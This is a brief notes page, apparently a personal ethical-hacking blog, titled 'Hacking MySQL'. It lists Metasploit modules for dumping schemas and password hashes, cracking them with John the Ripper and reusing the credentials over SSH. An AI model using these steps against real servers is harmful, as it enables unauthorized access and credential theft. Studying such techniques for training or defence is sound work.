---
title: MySQL
date: 2022-06-09 19:36:00 +/-0000
categories: [Ethical Hacking]
tags: [mysql]     # TAG names should always be lowercase
---

# Hacking MySQL

### Port Number
3306

### To find tables
''' bash
auxiliary/scanner/mysql/mysql_schemadump
'''

### To dump hashes

'''bash
auxiliary/scanner/mysql/mysql_hashdump
'''

Copy the username and password to text file then run

'''bash
John *filename*
'''

Then try logging in SSH using username and password